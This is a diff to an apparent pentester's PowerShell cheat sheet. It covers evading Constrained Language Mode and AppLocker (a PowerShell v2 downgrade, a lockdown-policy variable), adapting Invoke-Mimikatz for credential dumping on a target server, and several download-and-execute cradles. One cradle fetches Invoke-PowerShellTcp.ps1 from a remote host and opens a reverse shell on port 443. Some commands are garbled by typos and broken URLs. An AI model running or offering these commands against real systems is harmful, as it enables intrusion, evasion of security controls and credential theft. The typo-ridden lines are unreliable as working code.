@@ -51,29 +51,44 @@ Powersehll -encodedcommand $env:PSExecutionPolicyPreference="bypass"
 
 **Display current language mode**
 
+```powershell
 $executioncontext.sessionstate.languagemode
+```
 
-Constrained Language mode is the restriction of types which are not safe/disallowed in constrained language mode. E.g. .Net Classes,\
-cdOnly Built-In Commandlets can be used and types/classes etc. are restricted\
+Constrained Language mode is the restriction of types which are not safe/disallowed in constrained language mode. E.g. .Net Classes,
+
+Only Built-In Commandlets can be used and types/classes etc. are restricted\
 Can be configured via AppLoker or Windows Defender Application Mode in Enforcement mode.
 
 Constrained language mode is only for Powershellv5.1, v7 - if attacker can run Powershellv2 no language mode enforcement is possible.
 
-**Set language mode**
+**Set language mode - usually doesnt work**
 
 ```powershell
-$ExecutionContext.SessionState.LanguageMode = 'fulllanguage' ==> Not really possible
+$ExecutionContext.SessionState.LanguageMode = 'fulllanguage'
+[Environment]::SetEnvironmentVariable(‘__PSLockdownPolicy‘, ‘4’, ‘Machine‘)
 ```
 
 **Check AppLocker Policy - maybe some excludes form constrained language**
 
 ```powershell
 Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections 
+
+Default rule excludes C:\Windows\System32\
 ```
 
 **Invoke-mimikatz when Constrained Language mode is in place**
 
-So, we must modify Invoke-Mimikatz.ps1 to include the function call in the script itself and transfer the modified script (Invoke-MimikatzEx.ps1) to the target server.
+So, we must modify Invoke-Mimikatz.ps1 to include the function call in the script itself and transfer the modified script (.\Invoke-MimikatzEx.ps1) to the target server.
+
+**Check if you can run PowershellV2 which doesnt support CLM**
+
+```
+powershell -version 2
+-or-
+C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe
+$ExecutionContext.SessionState.LanguageMode
+```
 
 ### Execute .PS1 File / PowerView
 
@@ -132,9 +147,11 @@ ls function:
 
 ### Download and execute PowerShell Scripts
 
-<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">powershell iex (iwr -UseBasicParsing http://ip/Invoke-PowerShellTcp.ps1); Power -Reverse -IPAddress ip -Port 443 
+<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">powershell iex (iwr -UseBasicParsing http://ip/Invoke-PowerShellTcp.ps1)
+
+powershell iex (iwr -UseBasicParsing http://ip/Invoke-PowerShellTcp.ps1); Power -Reverse -IPAddress ip -Port 443 
 <strong>
-</strong><strong>iex (New-Object Net.WebClient).DownloadString('https://webserver/pay.ps1') - Invoke Expression (iex alias)
+</strong><strong>iex (New-Object Net.WebClient).DownloadString('http://webserver/pay.ps1')
 </strong></code></pre>
 
 Download and save PowerShell Script
@@ -157,8 +174,7 @@ $ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.na
 
 {% code overflow="wrap" %}
 ```powershell
-i Iex (iwr '
-http://websever/ps.ps1') -iwr is alias for invoke-web request
+i Iex (iwr 'http://websever/ps.ps1') -iwr is alias for invoke-web request
  $h=New-Object -ComObject
 Msxml2.xmlhttp;$h.open('GET','http://webserver/ps.ps1',$fasle);$h.send();iex $h.responseText
 $wr = [System.NET.WebRequest]::Create("http://werbser.ps.ps1")
